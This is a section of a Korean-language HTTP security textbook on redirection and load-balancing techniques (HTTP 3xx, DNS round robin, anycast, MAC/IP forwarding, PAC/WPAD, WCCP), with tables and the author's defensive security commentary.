HTTP는 웹을 혼자 걷지 않는다. HTTP 메시지 안의 데이터는 여정 동안 여러 프로토콜의 지배를 받는다. **HTTP가 관심을 갖는 것은 여정의 양 끝 — 송신자와 수신자 — 뿐이지만, 미러 서버와 웹 프록시와 캐시가 있는 세계에서 HTTP 메시지의 목적지는 자명하지 않다.**

리다이렉션 기술이란 HTTP 메시지의 최종 목적지를 결정하는 네트워크 도구·기법·프로토콜을 말한다. 이 기술들은 대개 메시지가 프록시로 갈지, 캐시로 갈지, 서버 팜의 특정 웹 서버로 갈지를 정한다. **그리고 리다이렉션 기술은 메시지를 클라이언트가 명시적으로 요청하지 않은 곳으로 보낼 수 있다.**

마지막 문장이 이 장의 후반부 전체를 관통한다. 그것은 결함이 아니라 이 기술들의 정의 자체다.

### 15.4.1 왜 리다이렉트하는가

현대 웹에서 리다이렉션은 일상이다. HTTP 애플리케이션이 언제나 원하는 것이 셋이기 때문이다.

- **HTTP 트랜잭션을 신뢰성 있게 수행하기**
- **지연을 최소화하기**
- **네트워크 대역폭을 아끼기**

이 이유로 웹 콘텐츠는 여러 위치에 분산된다. **신뢰성**을 위해서다 — 한 위치가 실패하면 다른 위치가 있다. **응답 시간을 낮추기** 위해서다 — 클라이언트가 더 가까운 리소스에 접근할 수 있으면 콘텐츠를 더 빨리 받는다. **네트워크 혼잡을 낮추기** 위해서다 — 대상 서버를 퍼뜨리면 트래픽이 분산된다. 리다이렉션은 **"가장 좋은" 분산 콘텐츠를 찾도록 돕는 기법의 집합**으로 생각할 수 있다.

로드 밸런싱을 함께 다루는 이유는 **리다이렉션과 로드 밸런싱이 공존하기 때문**이다. 대부분의 리다이렉션 배치는 어떤 형태로든 로드 밸런싱을 포함한다. 즉 들어오는 메시지 부하를 여러 서버에 퍼뜨릴 수 있다. 역으로, 모든 형태의 로드 밸런싱은 리다이렉션을 포함한다. 들어오는 메시지를 부하를 나눠 지는 서버들 사이로 어떻게든 보내야 하기 때문이다.

### 15.4.2 어디로 리다이렉트하는가

서버, 프록시, 캐시, 게이트웨이는 모두 클라이언트에게 서버처럼 보인다. 클라이언트가 HTTP 요청을 보내면 그것을 처리한다는 의미에서 그렇다. 이 공통의 서버적 성질 덕분에 많은 리다이렉션 기법이 네 종류 모두에 통한다. 반면 특정 종류의 종단을 위해 특별히 설계되어 일반적으로 적용되지 않는 기법도 있다.

**웹 서버는 요청을 IP 단위로 처리한다.** 복제된 서버들에 요청을 분배한다는 것은, 특정 URL에 대한 각 요청이 **최적의 웹 서버** — 클라이언트에 가장 가까운 것, 가장 덜 부하가 걸린 것, 혹은 다른 기준의 최적 — 로 보내져야 한다는 뜻이다. 원서의 비유로는 **주유소를 찾는 모든 운전자를 가장 가까운 주유소로 보내는 것**과 같다.

**프록시는 요청을 프로토콜 단위로 처리하는 경향이 있다.** 이상적으로는 프록시 근방의 모든 HTTP 트래픽이 그 프록시를 거쳐야 한다. 프록시 캐시가 여러 클라이언트 가까이에 있다면 모든 요청이 그 캐시를 흐르는 것이 이상적이다. 캐시가 인기 문서를 저장해 직접 서비스함으로써 원 서버로 가는 더 길고 비싼 여정을 피할 수 있기 때문이다. 원서의 비유로는 **간선도로의 트래픽을 (어디로 향하든) 지역 지름길로 빼내는 것**과 같다.

두 비유의 차이가 중요하다. 서버로의 리다이렉션은 **"어느 목적지"** 를 고르는 일이고, 프록시로의 리다이렉션은 **"경유지를 끼워 넣는"** 일이다. 후자에서 클라이언트가 원한 목적지는 바뀌지 않았지만, 요청을 실제로 처리하는 주체는 바뀐다.

### 15.4.3 이 장의 리다이렉션과 35.3절의 리다이렉션

`3xx` 상태 코드와 `Location` 헤더는 이 장에서도 나오고 35.3절에서도 나온다. 같은 메커니즘이지만 문제의 성격이 다르므로 여기서 선을 그어 둔다.

**표 15-4. 인프라 수준 리다이렉션과 애플리케이션 수준 오픈 리다이렉션**

| | 이 장 (15.4~15.8) | 35.3절 (오픈 리다이렉션) |
|---|---|---|
| 목적지를 정하는 주체 | 운영자, 혹은 운영자가 배치한 인프라 | 사용자 입력(파라미터·경로·헤더) |
| 목적지의 범위 | 운영자가 통제하는 자기 인프라 | 임의의 외부 도메인 |
| 의도 | 부하 분산, 근접성, 장애 회피 | 없음. 결함이다 |
| 위험의 형태 | 트래픽이 의도치 않은 경로로 흐름, 인프라 제어 평면 장악 | 신뢰받는 도메인이 공격자 사이트로 사용자를 보냄, 피싱·토큰 유출 |
| 관찰되는 계층 | HTTP, DNS, IP, 링크 계층 전반 | HTTP 애플리케이션 |

두 문제가 만나는 지점은 있다. 인프라 리다이렉션이 `Location` 값을 만들 때 그 권위 부분을 `Host` 헤더에서 가져오면, 클라이언트가 리다이렉트 목적지의 일부를 통제하게 된다(15.2.4절 둘째 항목). 그 순간 인프라 리다이렉션은 애플리케이션 리다이렉션과 같은 결함을 갖는다. 방어도 같다. **리다이렉트 대상은 서버가 아는 집합에서 골라야 하며, 클라이언트가 보낸 값에서 조립해서는 안 된다.**

## 15.5 리다이렉션 프로토콜 개관

리다이렉션의 목표는 HTTP 메시지를 가용한 웹 서버로 가능한 한 빨리 보내는 것이다. HTTP 메시지가 인터넷을 통과하며 취하는 방향은 그것이 출발하고, 통과하고, 향하는 HTTP 애플리케이션과 라우팅 장비의 영향을 받는다. 영향을 주는 지점은 넷이다.

- **브라우저 설정** — 클라이언트의 메시지를 만드는 브라우저 애플리케이션이 프록시 서버로 보내도록 설정되어 있을 수 있다.
- **DNS 리졸버** — 메시지 주소 지정에 쓰이는 IP 주소를 고른다. 이 IP 주소는 지리적 위치가 다른 클라이언트마다 다를 수 있다.
- **스위치와 라우터** — 메시지가 네트워크를 통과할 때 주소가 붙은 패킷으로 나뉘고, 스위치와 라우터가 패킷의 TCP/IP 주소를 검사해 그 근거로 라우팅을 결정한다.
- **웹 서버** — HTTP 리다이렉트로 요청을 다른 웹 서버로 되돌려 보낼 수 있다.

브라우저 설정, DNS, TCP/IP 라우팅, HTTP가 각각 메시지를 리다이렉트하는 메커니즘을 제공한다. 어떤 방법은 — 브라우저 설정처럼 — 트래픽을 프록시로 보내는 데만 의미가 있고, 다른 방법은 — DNS 리다이렉션처럼 — 어떤 서버로든 트래픽을 보내는 데 쓸 수 있다.

**표 15-5. 일반 리다이렉션 기법 (HTTP-DG 표 20-1 기준)**

| 메커니즘 | 동작 방식 | 재라우팅의 근거 | 한계 |
|---|---|---|---|
| **HTTP 리다이렉션** | 최초 HTTP 요청이 첫 번째 웹 서버로 가고, 그 서버가 콘텐츠를 서비스할 "최선의" 웹 서버를 골라 클라이언트에게 HTTP 리다이렉트를 보낸다. 클라이언트가 선택된 서버로 요청을 다시 보낸다 | 라운드로빈 부하 분산, 지연 최소화, 최단 경로 선택 등 다양 | 느릴 수 있다. 모든 트랜잭션에 추가 리다이렉트 단계가 든다. 또한 첫 번째 서버가 요청 부하를 감당할 수 있어야 한다 |
| **DNS 리다이렉션** | DNS 서버가 URL의 호스트명에 대해 여러 IP 주소 중 어느 것을 반환할지 결정한다 | 위와 같이 다양 | DNS 서버를 설정해야 한다 |
| **anycast 주소 지정** | 여러 서버가 같은 IP 주소를 쓴다. 각 서버가 백본 라우터인 척한다. 다른 라우터들은 그 공유 IP로 향하는 패킷을 (가장 가까운 라우터로 보낸다고 믿으며) 가장 가까운 서버로 보낸다 | 라우터에 내장된 최단 경로 라우팅 능력 | 라우터를 소유·설정해야 한다. 주소 충돌 위험이 있다. **라우팅이 바뀌어 한 커넥션에 속한 패킷들이 서로 다른 서버로 가면 이미 수립된 TCP 커넥션이 깨질 수 있다** |
| **IP MAC 포워딩** | 스위치나 라우터 같은 네트워크 요소가 패킷의 목적지 주소를 읽고, 리다이렉트해야 할 패킷이면 서버나 프록시의 목적지 MAC 주소를 부여한다 | 대역폭 절약과 QoS 개선. 부하 분산 | 서버나 프록시가 한 홉 거리에 있어야 한다 |
| **IP 주소 포워딩** | 4계층 스위치가 패킷의 목적지 포트를 평가하고, 리다이렉트 패킷의 IP 주소를 프록시나 미러 서버의 것으로 바꾼다 | 대역폭 절약과 QoS 개선. 부하 분산 | **클라이언트의 IP 주소가 서버·프록시에게 소실될 수 있다** |

**표 15-6. 프록시·캐시 리다이렉션 기법 (HTTP-DG 표 20-2 기준)**

| 메커니즘 | 동작 방식 | 재라우팅의 근거 | 한계 |
|---|---|---|---|
| **명시적 브라우저 설정** | 브라우저가 근처 프록시(대개 캐시)로 HTTP 메시지를 보내도록 설정된다. 설정은 최종 사용자가 하거나 브라우저를 관리하는 서비스가 한다 | 대역폭 절약과 QoS 개선. 부하 분산 | 브라우저를 설정할 수 있어야 한다 |
| **프록시 자동 설정(PAC)** | 브라우저가 설정 서버에서 PAC 파일을 가져온다. PAC 파일이 URL마다 어느 프록시를 쓸지 알려 준다 | 대역폭 절약과 QoS 개선. 부하 분산 | 브라우저가 설정 서버에 질의하도록 설정되어야 한다 |
| **WPAD** | 브라우저가 설정 서버에게 PAC 파일의 URL을 묻는다. PAC 단독과 달리 브라우저에 특정 설정 서버를 설정해 둘 필요가 없다 | 설정 서버가 클라이언트 HTTP 요청 헤더의 정보를 근거로 URL을 정한다. 부하 분산 | 소수의 브라우저만 WPAD를 지원한다 |
| **WCCP** | 라우터가 패킷의 목적지 주소를 평가하고 리다이렉트 패킷을 프록시나 미러 서버의 IP 주소로 캡슐화한다. 많은 기존 라우터에서 동작한다. **패킷을 캡슐화할 수 있으므로 클라이언트 IP 주소가 소실되지 않는다** | 대역폭 절약과 QoS 개선. 부하 분산 | WCCP를 지원하는 라우터를 써야 한다. 토폴로지 제약이 일부 있다 |
| **ICP** | 프록시 캐시가 형제 캐시 집단에 요청된 콘텐츠를 질의할 수 있다. 캐시 계층도 지원한다 | 형제나 부모 캐시에서 얻는 것이 원 서버에 요청하는 것보다 빠르다 | URL만으로 콘텐츠를 요청하므로 거짓 히트가 생길 수 있다 |
| **CARP** | 프록시 캐시 해싱 프로토콜. ICP와 달리 캐시들의 콘텐츠가 겹치지 않으며 캐시 집단이 하나의 큰 캐시처럼 동작한다 | 가까운 피어 캐시에서 얻는 것이 원 서버에 요청하는 것보다 빠르다 | 형제 관계를 지원하지 못한다. 모든 CARP 클라이언트가 같은 설정에 동의해야 한다 |
| **HTCP** | 참여 프록시 캐시가 형제 캐시 집단에 질의한다. HTTP 1.0·1.1 헤더를 지원해 캐시 질의를 정교하게 다듬는다 | 형제나 부모 캐시에서 얻는 것이 원 서버에 요청하는 것보다 빠르다 | — |

**표 15-6의 마지막 세 행 — ICP, CARP, HTCP — 는 14.11절에서 이미 상세히 다뤘다.** 역할 분담을 다시 확인하면, 14.11절은 **트래픽이 이미 캐시에 도착한 뒤 캐시들이 서로에게 묻고 답하는 프로토콜**을 다루고, 15.8절은 **트래픽을 애초에 캐시로 보내는 기법**을 다룬다. 이 절의 표에 세 프로토콜을 남겨 둔 것은 원서의 분류를 온전히 보이기 위해서이며, 이 장에서 상세히 서술하는 것은 WCCP뿐이다.

### 15.5.1 이 책의 축: 클라이언트는 자기 요청이 어디로 가는지 아는가

원서의 두 표는 기법을 **어떤 종단으로 보내는가**로 나눈다. 이 책의 관심사에서는 다른 축이 필요하다. **요청의 목적지가 바뀌었다는 사실을 클라이언트가 아는가, 그리고 목적지를 정한 근거를 누가 통제하는가**이다.

**표 15-7. 리다이렉션 기법의 신뢰 관점 분류 (이 책의 정리)**

| 부류 | 기법 | 결정이 이루어지는 계층 | 클라이언트가 아는가 | 클라이언트 IP가 보존되는가 | 결정을 통제하는 주체 |
|---|---|---|---|---|---|
| **클라이언트가 알고 동의한다** | 명시적 브라우저 설정 | 애플리케이션 설정 | 안다 | — (프록시가 원 서버에게 대리) | 사용자 또는 관리자 |
| | HTTP `3xx` | HTTP | **안다** (`Location`을 받는다) | 보존 | 첫 번째 웹 서버 |
| **클라이언트가 결과만 안다** | DNS 라운드로빈·근접 라우팅 | 이름 해석 | 이름이 주소로 바뀐 것만 안다 | 보존 | 권위 DNS 서버 |
| | anycast | IP 라우팅 | 모른다 | 보존 | 백본 라우터의 최단 경로 |
| **클라이언트가 알지 못한다** | PAC | 애플리케이션 (실행 코드) | 파일을 가져온 사실만 안다 | — | **PAC 파일을 제공한 자** |
| | WPAD | 발견 프로토콜 + 애플리케이션 | 사실상 모른다 | — | **발견 응답을 보낸 자** |
| | IP MAC 포워딩 | 링크 계층 | 모른다 | 보존 | 스위치 설정 |
| | IP 주소 포워딩 (full NAT) | 네트워크 계층 | 모른다 | **소실** | 스위치 설정 |
| | IP 주소 포워딩 (half NAT) | 네트워크 계층 | 모른다 | 보존 | 스위치 설정 + 네트워크 배선 |
| | WCCP | 네트워크 계층 (GRE 캡슐화) | 모른다 | **보존** | WCCP 서비스 그룹 설정 |

표에서 읽어야 할 것이 셋이다.

**첫째, 아래로 갈수록 클라이언트의 동의가 사라진다.** HTTP `3xx`는 클라이언트가 새 URL을 받아 스스로 다시 요청하는 것이므로 클라이언트가 목적지 변경을 안다. IP MAC 포워딩과 WCCP는 클라이언트가 자기가 요청한 서버와 말하고 있다고 믿는 동안 패킷의 목적지가 바뀐다. **13.5절이 서술한 인터셉팅 프록시의 부분 URI 문제, 14.8절이 서술한 공유 캐시의 기밀성 문제는 클라이언트의 동의 없이 성립한다.** 인터셉션은 그 성립 조건을 만드는 기법이다.

**둘째, PAC와 WPAD는 다른 부류다.** 다른 기법들은 네트워크 장비의 설정이 목적지를 정하지만, PAC는 **브라우저가 실행하는 프로그램**이 요청마다 목적지를 계산한다. 그 프로그램의 출처를 정하는 것이 WPAD이고, WPAD의 출처를 정하는 것은 로컬 네트워크의 DHCP·DNS 응답이다. 결정권이 가장 멀리, 가장 검증되지 않은 곳까지 밀려나 있다. 15.7절의 주제다.

**셋째, "클라이언트 IP가 보존되는가" 열은 그 자체로 보안 결과를 갖는다.** full NAT에서 클라이언트 IP가 소실되면, 그 뒤의 모든 서버는 인증·과금·요율 제한·로깅에 쓸 클라이언트 식별자를 잃는다. 공백을 메우려고 `X-Forwarded-For` 같은 헤더를 도입하면 **다시 클라이언트가 통제하는 문자열로 돌아간다.** 15.2절의 구조가 여기서 그대로 반복된다(→ 8.6, 16장).

> **이 절이 뒷받침하는 것**
>
> - 인터셉션이 클라이언트 동의 없이 캐시를 경로에 놓는다는 사실 → **13.5** (부분 URI), **14.8** (공유 캐시)
> - 클라이언트 IP 소실과 그 대체 헤더 → **8.6** (헤더의 신뢰성), **16.1** (무엇을 로깅할 것인가)
> - 결정권이 발견 프로토콜까지 밀려난다는 사실 → **15.7** (PAC·WPAD), **1.8** (하위 계층 공격의 지형)

## 15.6 일반 리다이렉션 기법 — HTTP 3xx, DNS 라운드로빈, anycast, IP MAC/주소 전달, NECP

이 절은 서버와 프록시 양쪽에 두루 쓰이는 기법들을 본다. 이 기법들은 트래픽을 다른(추정컨대 더 최적인) 서버로 보내거나 프록시를 경유하도록 유도하는 데 쓸 수 있다.

### 15.6.1 HTTP 리다이렉션

웹 서버는 클라이언트에게 짧은 리다이렉트 메시지를 보내 다른 곳을 시도하라고 말할 수 있다. 일부 사이트는 이것을 단순한 로드 밸런싱으로 쓴다. 리다이렉트를 처리하는 서버(**리다이렉팅 서버**)가 가용한 콘텐츠 서버 중 가장 덜 부하가 걸린 것을 찾아 브라우저를 그쪽으로 보낸다. 널리 분산된 사이트에서는 "최선의" 서버를 정하는 일이 더 복잡해져서 서버 부하뿐 아니라 브라우저와 서버 사이의 인터넷 거리도 고려한다.

**다른 리다이렉션 방식에 비해 HTTP 리다이렉션이 갖는 장점 하나는 리다이렉팅 서버가 클라이언트의 IP 주소를 안다는 것이다.** 이론상 더 잘 판단할 수 있다.

동작은 이렇다. Alice가 `www.joes-hardware.com`에 요청을 보낸다.

```
GET /hammers.html HTTP/1.0
Host: www.joes-hardware.com
User-Agent: Mozilla/4.51 [en] (X11; U; IRIX 6.2 IP22)
```

서버는 상태 코드 200과 함께 본문을 돌려주는 대신 상태 코드 302의 리다이렉트 메시지를 보낸다.

```
HTTP/1.0 302 Redirect
Server: Stronghold/2.4.2 Apache/1.3.6
Location: http://161.58.228.45/hammers.html
```

브라우저는 리다이렉트된 URL로 요청을 다시 보낸다. 이번에는 호스트 161.58.228.45로 간다.

```
GET /hammers.html HTTP/1.0
Host: 161.58.228.45
User-Agent: Mozilla/4.51 [en] (X11; U; IRIX 6.2 IP22)
```

*예제 15-3. HTTP 리다이렉션의 세 메시지 (HTTP-DG 그림 20-1 기준)*

다른 클라이언트는 다른 서버로 리다이렉트될 수 있다. Bob의 요청은 161.58.228.46으로 간다.

HTTP 리다이렉션은 요청을 서버들에 벡터링할 수 있지만 단점이 몇 가지 있다.

- **원래 서버에서 상당한 처리 능력이 필요하다.** 어느 서버로 리다이렉트할지 결정하는 데 때로는 페이지를 직접 서비스하는 것과 거의 같은 서버 마력이 든다.
- **사용자 지연이 늘어난다.** 페이지에 접근하는 데 2왕복이 필요하기 때문이다.
- **리다이렉팅 서버가 고장 나면 사이트 전체가 고장 난다.**

이런 약점 때문에 HTTP 리다이렉션은 대개 다른 리다이렉션 기법과 조합해 쓰인다.

**보안 관점에서 짚을 것.** 세 번째 요청의 `Host` 헤더가 `161.58.228.45`라는 점을 보라. 클라이언트는 이제 이름이 아니라 주소로 말하고 있다. 이것은 15.2.2절의 명세 요구 — URL이 호스트명을 담고 있으면 `Host`에 IP 등가물을 담아서는 안 된다 — 를 정확히 위반하는 형태이며, 그 이유는 리다이렉트가 URL 자체를 주소로 바꿔 버렸기 때문이다. 결과적으로 **리다이렉트 이후의 요청은 목적지 서버에서 이름 기반 가상 호스팅의 분기를 통과하지 못하고 기본 호스트로 떨어진다.** 12.9절이 다룬 기본 호스트 문제가 정상 트래픽에서 발생하는 경로가 여기다. 그래서 실제 배치에서는 IP가 아니라 레플리카의 이름(`replica3.joes-hardware.com` 같은)으로 리다이렉트하는 편이 낫다.

그리고 `Location` 값을 만드는 코드가 요청의 `Host` 값을 재료로 쓰지 않는지 확인해야 한다. 쓴다면 15.4.3절이 그은 선이 지워진다.

### 15.6.2 DNS 리다이렉션

클라이언트가 Joe's Hardware 사이트에 접근할 때마다 `www.joes-hardware.com`이라는 도메인 이름이 IP 주소로 해석되어야 한다. DNS 리졸버는 클라이언트 자신의 운영체제일 수도, 클라이언트 네트워크의 DNS 서버일 수도, 더 먼 DNS 서버일 수도 있다(→ 2.3).

**DNS는 하나의 도메인에 여러 IP 주소를 연결하는 것을 허용하며, DNS 리졸버는 다양한 IP 주소를 반환하도록 설정하거나 프로그래밍할 수 있다.** 리졸버가 어떤 근거로 주소를 반환하는가는 단순한 것(라운드로빈)부터 복잡한 것(여러 서버의 부하를 확인해 가장 덜 부하가 걸린 서버의 주소를 반환)까지 있다.

#### DNS 라운드로빈

가장 흔한 리다이렉션 기법 중 하나이자 가장 단순한 것 중 하나다. **DNS 라운드로빈은 DNS 호스트명 해석의 한 성질을 이용해 웹 서버 팜에 부하를 분산한다.** 순수한 로드 밸런싱 전략이며, 클라이언트와 서버의 상대적 위치나 서버의 현재 부하 같은 요인을 전혀 고려하지 않는다.

원서가 2000년 5월에 `nslookup`으로 확인한 `www.cnn.com`은 20개의 서로 다른 IP 주소로 이루어진 팜이었다.

```
% nslookup www.cnn.com
Name:    cnn.com
Addresses:  207.25.71.5, 207.25.71.6, 207.25.71.7, 207.25.71.8
            207.25.71.9, 207.25.71.12, 207.25.71.20, 207.25.71.22, 207.25.71.23
            ...
            207.25.71.246
Aliases:   www.cnn.com
```

*예제 15-4. `www.cnn.com`의 IP 주소 목록 (HTTP-DG 예제 20-1 기준. 2000년 5월 7일 북부 캘리포니아에서 해석한 값이며, 특정 값은 시간에 따라 바뀌고 일부 DNS 시스템은 클라이언트 위치에 따라 다른 값을 반환한다.)*

**대부분의 DNS 클라이언트는 다중 주소 집합의 첫 번째 주소만 쓴다.** 부하를 분산하기 위해 대부분의 DNS 서버는 조회할 때마다 주소를 회전시킨다. 이 주소 회전을 흔히 **DNS 라운드로빈**이라 한다. 연속된 세 번의 조회에서 첫 번째 주소가 207.25.71.5 → 207.25.71.6 → 207.25.71.7로 바뀌는 식이다.

Alice가 `www.cnn.com`에 접속하려 하면 DNS로 주소를 조회해 첫 번째 IP로 207.25.71.5를 받고 그 서버에 접속한다. 뒤이어 Bob이 접속하려 하면 Alice의 앞선 요청 때문에 목록이 한 칸 회전해 207.25.71.6을 받고 그 서버에 접속한다.

#### DNS 캐싱의 영향

주소 회전은 부하를 퍼뜨리지만 이 로드 밸런싱은 완벽하지 않다. **DNS 조회 결과가 애플리케이션, 운영체제, 일부 원시적인 자식 DNS 서버에 의해 기억되고 재사용되기 때문이다**(→ 2.5).

많은 웹 브라우저가 호스트에 대해 DNS 조회를 한 번 한 뒤 같은 주소를 계속 쓴다. 조회 비용을 없애기 위해서이기도 하고 일부 서버가 같은 클라이언트와 계속 대화하기를 선호하기 때문이기도 하다. 더구나 많은 운영체제가 DNS 조회를 자동으로 수행하고 결과를 캐시하되 **주소를 회전시키지는 않는다.** 결과적으로 **DNS 라운드로빈은 단일 클라이언트의 부하는 분산하지 못한다.** 한 클라이언트는 대체로 오랫동안 한 서버에 고착된다.

그러나 DNS가 단일 클라이언트의 트랜잭션을 서버 복제본들에 나눠 주지는 못해도, **여러 클라이언트의 총 부하를 퍼뜨리는 일은 꽤 잘 해낸다.** 비슷한 수요를 가진 클라이언트가 적당히 많다면 부하는 서버들에 상대적으로 고르게 분산된다.

#### 다른 DNS 기반 알고리즘

일부 개선된 DNS 서버는 주소 순서를 정할 때 다른 기법을 쓴다.

- **로드 밸런싱 알고리즘** — 웹 서버의 부하를 추적해 가장 덜 부하가 걸린 서버를 목록 앞에 놓는다.
- **근접 라우팅 알고리즘** — 웹 서버 팜이 지리적으로 분산되어 있을 때 사용자를 가까운 서버로 유도하려 시도한다.
- **장애 마스킹 알고리즘** — 네트워크의 건강 상태를 감시해 서비스 중단이나 다른 장애로부터 요청을 우회시킨다.

정교한 서버 추적 알고리즘을 돌리는 DNS 서버는 대개 **콘텐츠 제공자의 통제 아래 있는 권위 서버**다. 여러 분산 호스팅 서비스가 이 DNS 리다이렉션 모델을 쓴다.

**그런데 가까운 서버를 찾으려는 서비스에 대해 이 모델에는 결정적인 약점이 있다. 권위 DNS 서버가 판단에 쓸 수 있는 유일한 정보는 로컬 DNS 서버의 IP 주소이지 클라이언트의 IP 주소가 아니다.** 클라이언트는 자기 리졸버에게 묻고, 리졸버가 권위 서버에게 묻는다. 권위 서버가 보는 것은 리졸버다. 클라이언트가 지구 반대편의 공개 리졸버를 쓰고 있다면 "근접"의 판단은 완전히 어긋난다.

#### 이 기법의 보안적 성질

DNS 자체 — 해석의 흐름, 캐싱, TTL, 이름과 신원의 관계, 리바인딩 — 는 2장의 소관이다. 여기서는 **DNS를 트래픽 분산 수단으로 쓸 때 생기는 성질**만 짚는다(→ 2.6).

**첫째, 이름-주소 바인딩이 운영 도구가 되면서 짧아진다.** 장애 마스킹과 부하 분산을 하려면 TTL이 짧아야 한다. 그래야 서버를 뺐을 때 클라이언트가 빨리 따라온다. 짧은 TTL은 **하나의 이름이 짧은 시간 안에 여러 주소를 가리키는 상태**를 정상으로 만든다. 2.8절이 다룬 DNS 리바인딩이 성립하는 전제 — 이름 해석의 결과가 시점마다 다르다는 것 — 가 여기서는 의도된 운영 관행이다. 두 가지를 구별할 수 없다는 것이 방어를 어렵게 한다.

**둘째, IP 기반 허용 목록이 무력해진다.** 상대 서비스가 DNS 라운드로빈이나 근접 라우팅을 쓰고 있으면 그 서비스의 주소 집합은 고정되어 있지 않다. 방화벽 규칙이나 애플리케이션의 허용 목록을 IP로 쓰면 어느 순간 정상 트래픽이 막히거나, 반대로 주소가 재활용될 때 허용 목록이 엉뚱한 대상을 가리킨다. **이름으로 쓰면 해석 시점마다 결과가 바뀌므로 검사 시점과 사용 시점 사이에 틈이 생긴다**(2.8절이 서술한 구조).

**셋째, 로드 밸런싱의 관측 가능성이 낮다.** 어느 클라이언트가 어느 서버에 갔는지는 DNS 응답이 결정하고 그 응답은 로그에 남지 않는 경우가 많다. 서버 하나에서 이상 징후를 발견해도 그 서버로 트래픽이 간 경위를 재구성하기 어렵다(→ 16.5).

### 15.6.3 anycast 주소 지정

**anycast 주소 지정에서는 지리적으로 분산된 여러 웹 서버가 완전히 같은 IP 주소를 갖고, 백본 라우터의 "최단 경로" 라우팅 능력에 의존해 클라이언트 요청이 가장 가까운 서버로 가게 한다.**

동작하는 방식 하나는 각 웹 서버가 이웃 백본 라우터에게 자신을 라우터로 광고하는 것이다. 웹 서버는 라우터 통신 프로토콜로 이웃 백본 라우터와 대화한다. 백본 라우터가 anycast 주소를 향하는 패킷을 받으면 (평소처럼) 그 IP 주소를 받아들이는 가장 가까운 "라우터"를 찾는다. 서버가 그 주소에 대한 라우터로 자신을 광고해 두었으므로 백본 라우터는 서버에게 패킷을 보낸다.

세 서버가 같은 10.10.10.1을 내세우고 LA 서버가 LA 라우터에, 뉴욕 서버가 뉴욕 라우터에 그 주소를 광고하면, 10.10.10.1을 향하는 요청은 그 주소를 광고하는 가장 가까운 서버로 자동으로 라우팅된다.

anycast 주소 지정은 여전히 실험적 기법이다. 분산 anycast가 동작하려면 **서버가 "라우터 언어"를 말할 수 있어야 하고 라우터가 발생 가능한 주소 충돌을 처리할 수 있어야 한다.** 인터넷 주소 지정이 기본적으로 하나의 주소에 하나의 서버를 가정하기 때문이다. 잘못하면 **경로 누출(route leak)** 이라는 심각한 문제로 이어진다. 분산 anycast는 자기 백본 네트워크를 통제하는 콘텐츠 제공자에게 해법이 될 수 있는 신흥 기술이다.

**보안 관점에서 짚을 것.** 표 15-5에 적힌 한계 — 라우팅이 바뀌어 한 커넥션의 패킷들이 서로 다른 서버로 가면 수립된 TCP 커넥션이 깨질 수 있다 — 를 뒤집어 읽으면 이렇다. **anycast 주소로 향하는 트래픽의 실제 수신자는 라우팅 상태가 결정하며, 그 상태는 종단 어느 쪽도 통제하지 않는다.** 라우팅 프로토콜을 조작할 수 있는 위치에 있는 자는 그 주소로 향하는 트래픽의 목적지를 바꿀 수 있다. 이것은 1.8절이 서술한 하위 계층 공격의 성립 조건이 IP 라우팅 계층에서 나타나는 형태다. anycast 위에서 종단 인증(→ 18장)이 필수인 이유가 여기 있다. 주소는 신원이 아니다(→ 2.7).

### 15.6.4 IP MAC 포워딩

이더넷 네트워크에서 HTTP 메시지는 주소가 붙은 데이터 패킷의 형태로 전송된다. 각 패킷은 **4계층 주소** — 출발지·목적지 IP 주소와 TCP 포트 번호 — 를 갖고, 4계층을 인식하는 장비가 이것에 주의를 기울인다. 각 패킷은 또 **2계층 주소** — MAC(Media Access Control) 주소 — 를 갖고, 2계층 장비(흔히 스위치와 허브)가 이것에 주의를 기울인다. **2계층 장비의 일은 특정 입력 MAC 주소를 가진 패킷을 받아 특정 출력 MAC 주소로 전달하는 것이다.**

**4계층을 인식하는 스위치**는 4계층 주소 지정(IP 주소와 TCP 포트 번호)을 검사하고 그 정보를 근거로 라우팅을 결정할 수 있다. 예를 들어 4계층 스위치는 80번 포트로 향하는 모든 웹 트래픽을 프록시로 보낼 수 있다.

```
   클라이언트 MAC1 ─┐
                     ├─ [허브 MAC3] ── [스위치 MAC4] ── [게이트웨이 MAC5] ── 인터넷
   클라이언트 MAC2 ─┘                        │
                                    80번 포트 트래픽
                                             │
                                   [캐싱 프록시 MAC6]
```

*그림 15-2. 4계층 스위치를 이용한 MAC 포워딩 (HTTP-DG 그림 20-7 기준)*

스위치는 MAC3에서 온 80번 포트 트래픽 전부를 MAC6(프록시 캐시)으로 보내도록 프로그래밍된다. MAC3의 다른 트래픽은 전부 MAC5로 간다. 일반적으로 요청된 HTTP 콘텐츠가 캐시에 있고 신선하면 프록시 캐시가 그것을 서비스하고, 그렇지 않으면 클라이언트를 대신해 원 서버로 HTTP 요청을 보낸다. 스위치는 프록시(MAC6)에서 온 80번 포트 요청을 인터넷 게이트웨이(MAC5)로 보낸다.

MAC 포워딩을 지원하는 4계층 스위치는 대개 여러 프록시 캐시로 요청을 전달하고 그들 사이에 부하를 분산할 수 있다. 마찬가지로 HTTP 트래픽을 대체 HTTP 서버로 전달할 수도 있다.

**MAC 주소 전달은 점대점(point-to-point)이므로 서버나 프록시가 스위치에서 한 홉 거리에 있어야 한다.**

### 15.6.5 IP 주소 포워딩

IP 주소 포워딩에서는 스위치나 다른 4계층 인식 장비가 들어오는 패킷의 TCP/IP 주소 지정을 검사하고, **목적지 MAC 주소가 아니라 목적지 IP 주소를 바꿔** 패킷을 라우팅한다. MAC 포워딩에 비해 목적지 서버가 한 홉 거리에 있을 필요가 없다는 장점이 있다. 스위치의 상류에 있기만 하면 되고, 통상의 3계층 종단 간 인터넷 라우팅이 패킷을 제자리로 보낸다. 이런 전달을 **네트워크 주소 변환(Network Address Translation, NAT)** 이라고도 한다.

다만 함정이 있다. **라우팅 대칭성**이다. 클라이언트로부터 들어오는 TCP 커넥션을 수락한 스위치가 그 커넥션을 관리하며, 그 TCP 커넥션 위로 응답을 클라이언트에게 돌려보내야 한다. 따라서 목적지 서버나 프록시로부터의 응답은 반드시 스위치로 돌아와야 한다.

응답의 반환 경로를 통제하는 방법은 둘이다.

- **패킷의 출발지 IP 주소를 스위치의 IP 주소로 바꾼다.** 그러면 스위치와 서버 사이의 네트워크 구성과 무관하게 응답 패킷이 스위치로 간다. 이것을 **full NAT** 라 하며, IP 전달 장비가 목적지와 출발지 IP 주소를 둘 다 변환한다. **결과적으로 클라이언트 IP 주소를 웹 서버가 알 수 없게 되며, 서버는 그것을 인증이나 과금 등에 쓰고 싶어 할 수 있다.**
